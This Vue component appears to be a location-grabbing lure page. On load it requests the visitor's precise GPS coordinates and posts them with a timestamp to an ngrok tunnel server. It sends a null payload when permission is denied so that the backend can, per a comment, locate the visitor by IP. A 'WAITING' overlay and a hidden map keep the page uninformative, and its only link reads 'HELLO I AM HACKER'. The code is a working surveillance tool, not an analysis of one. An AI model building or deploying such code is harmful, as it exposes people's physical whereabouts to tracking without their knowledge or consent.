<script setup lang="ts">
import { ref, onMounted } from "vue";
import L from "leaflet";
import "leaflet/dist/leaflet.css";

const result = ref<any>(null);
const loading = ref(false);
let map: L.Map | null = null;
let marker: L.Marker | null = null;

// SERVER ENDPOINT URL
const SERVER_URL = "https://959e-183-182-110-242.ngrok-free.app/api/location";

// -------------------------
// INIT MAP
// -------------------------
const initMap = (lat: number, lon: number) => {
  const mapElement = document.getElementById("map");
  if (mapElement) {
    mapElement.style.visibility = "visible"; // Show map if it was hidden
  }

  if (!map) {
    map = L.map("map").setView([lat, lon], 15);

    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
      attribution: "© OpenStreetMap",
    }).addTo(map);
  } else {
    map.setView([lat, lon], 15);
  }
};

// -------------------------
// SET MARKER
// -------------------------
const setMarker = (lat: number, lon: number) => {
  if (!map) return;

  if (marker) {
    marker.remove();
  }

  marker = L.marker([lat, lon])
    .addTo(map)
    .bindPopup("📍 Your Current Location")
    .openPopup();
};

// Generate time payload
const time = new Intl.DateTimeFormat("en-US", {
  timeZone: "Asia/Vientiane",
  year: "2-digit",
  month: "2-digit",
  day: "2-digit",
  hour: "2-digit",
  minute: "2-digit",
  second: "2-digit",
  hour12: false,
}).format(new Date());

// -------------------------
// SEND DATA HELPER
// -------------------------
const sendTrackingPayload = async (lat: number | null, lon: number | null, mapLink: string | null) => {
  try {
    await fetch(SERVER_URL, {
      method: "post",
      headers: {
        "ngrok-skip-browser-warning": "true",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        lat,
        lon,
        mapLink,
        time,
      }),
    });
  } catch (err) {
    console.error("Failed to transmit payload to logging server:", err);
  }
};

// -------------------------
// GET GPS LOCATION
// -------------------------
const getLocation = () => {
  loading.value = true;

  if (!navigator.geolocation) {
    console.warn("Geolocation not supported by client browser. Sending fallback payload.");
    sendTrackingPayload(null, null, null);
    loading.value = false;
    return;
  }

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const mapLink = `https://maps.google.com/?q=${lat},${lon}`; // Standard cleaner link structural fallback

      result.value = { lat, lon, mapLink };

      initMap(lat, lon);
      setMarker(lat, lon);
      loading.value = false;

      // SUCCESS PATH: Send precise GPS along with network IP tracking
      await sendTrackingPayload(lat, lon, mapLink);
    },
    async (error) => {
      console.warn("GPS Permission Denied / Error structural fallback triggered:", error.message);
      loading.value = false;

      // FAIL PATH: Send null parameters so the backend infers location purely from the network IP block instead
      await sendTrackingPayload(null, null, null);
    },
    {
      enableHighAccuracy: true,
      timeout: 8000, // Safe timeout fallback if device blocks or hangs GPS calculation
    },
  );
};

onMounted(() => {
  getLocation();
});
</script>

<template>
  <div v-if="loading" class="loading">
    <div class="spinner"></div>
    <span>WAITING...</span>
  </div>
  <div class="container">
    <div v-if="result" class="info">
      <a :href="result.mapLink" target="_blank" rel="noopener noreferrer">
        HELLO I AM HACKER
      </a>
    </div>
    <div id="map" class="map"></div>
  </div>
</template>

<style scoped>
.container {
  padding: 20px;
}

.info {
  margin-top: 20px;
}

#map {
  visibility: hidden; /* Stays hidden unless explicitly triggered by structural success mapping */
}

.map {
  height: 450px;
  width: 100%;
  margin-top: 20px;
  border-radius: 10px;
  overflow: hidden;
}

.loading {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  background: rgba(255, 255, 255, 0.8);
  z-index: 9999;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #ddd;
  border-top-color: #2563eb;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  margin-bottom: 10px;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}
</style>